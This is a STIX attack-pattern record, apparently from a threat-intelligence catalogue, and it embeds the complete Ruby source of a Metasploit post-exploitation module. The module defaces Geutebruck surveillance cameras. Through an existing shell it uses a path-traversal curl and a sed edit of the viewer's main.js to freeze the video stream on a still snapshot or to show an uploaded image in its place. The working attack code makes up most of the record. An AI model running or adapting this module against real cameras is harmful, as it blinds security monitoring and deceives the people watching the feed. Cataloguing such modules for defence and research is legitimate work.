{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d5aefc33-4921-4d23-b4d9-b134376ec18b",
    "created": "2024-08-14T16:33:13.581672Z",
    "modified": "2024-08-14T16:33:13.581675Z",
    "name": "Geutebruck Camera Deface",
    "description": " This module will take an existing session on a vulnerable Geutebruck Camera and will allow the user to either freeze the camera and display the last image from the video stream, display an image on the camera, or restore the camera back to displaying the current feed/stream. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/manage/geutebruck_post_exp.rb",
            "external_id": "geutebruck_post_exp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n\n  def initialize\n    super(\n      'Name' => 'Geutebruck Camera Deface',\n      'Description' => %q{\n        This module will take an existing session on a vulnerable Geutebruck Camera\n        and will allow the user to either freeze the camera and display the last\n        image from the video stream, display an image on the camera, or restore\n        the camera back to displaying the current feed/stream.\n      },\n      'Author' => [\n        'Ibrahim Ayadhi', # RandoriSec - Module, Discovery\n        'S\u00e9bastien Charbonnier', # RandoriSec - Module, Discovery\n      ],\n      'License' => MSF_LICENSE,\n      'Platform' => ['linux'],\n      'SessionTypes' => ['shell'],\n      'Actions' => [\n        ['FREEZE_CAMERA', { 'Description' => 'Freeze the camera and display the last image taken from the video stream' }],\n        ['CHANGE_IMAGE', { 'Description' => 'Display an arbitrary image instead of the video stream' }],\n        ['RESUME_STREAM', { 'Description' => \"Resume the camera's video stream and display the current live feed\" }]\n      ],\n      'DefaultAction' => 'FREEZE_CAMERA'\n    )\n\n    register_options(\n      [\n        OptString.new('IMAGE', [false, 'Full path to the local copy of the image to upload']),\n      ]\n    )\n  end\n\n  def run\n    print_status('-- Starting action --')\n    case action.name.downcase\n    when 'freeze_camera'\n      action_freeze_camera\n    when 'change_image'\n      action_change_image\n    when 'resume_stream'\n      action_resume_stream\n    end\n  end\n\n  def action_freeze_camera\n    print_status('Taking a snapshot of the current stream to use as the static image to freeze the stream on...')\n    cmd_exec('curl http://localhost/test/../uapi-cgi/snapshot.fcgi -o /usr/www/uapi-cgi/viewer/image.fcgi')\n    print_status('Freezing the stream on the captured image...')\n    pwn_main_js\n    print_status('Stream frozen!')\n  end\n\n  def action_change_image\n    fail_with(Failure::BadConfig, 'The CHANGE_IMAGE action requires the IMAGE option to be set!') if datastore['IMAGE'].blank?\n    fail_with(Failure::BadConfig, 'The image path specified by IMAGE does not exist!') unless ::File.exist?(datastore['IMAGE'])\n    print_status('Uploading a custom image...')\n    upload_file('/usr/www/uapi-cgi/viewer/image.fcgi', datastore['image'])\n    pwn_main_js\n    print_status('Done! The stream should be replaced by your image!')\n  end\n\n  def action_resume_stream\n    print_status('Resuming stream...')\n    unless file_exist?('/usr/www/viewer/js/main.js.bak')\n      fail_with(Failure::NoTarget, \"/usr/www/viewer/js/main.js.bak doesn't exist on the target, did you run FREEZE_CAMERA or CHANGE_IMAGE actions yet?\")\n    end\n    print_status('Restoring main.js backup...')\n    move_file('/usr/www/viewer/js/main.js.bak', '/usr/www/viewer/js/main.js')\n    print_status('Restored! Stream back to a normal state.')\n  end\n\n  def pwn_main_js\n    print_status('Backing up the original main.js...')\n    copy_file('/usr/www/viewer/js/main.js', '/usr/www/viewer/js/main2.js')\n    move_file('/usr/www/viewer/js/main.js', '/usr/www/viewer/js/main.js.bak')\n    print_status('Using the new main.js...')\n    cmd_exec(\"sed '/ImageBuf.src = snapshot_url;/ i snapshot_url=\\\"/uapi-cgi/viewer/image.fcgi\\\"' -i /usr/www/viewer/js/main2.js\")\n    move_file('/usr/www/viewer/js/main2.js', '/usr/www/viewer/js/main.js')\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}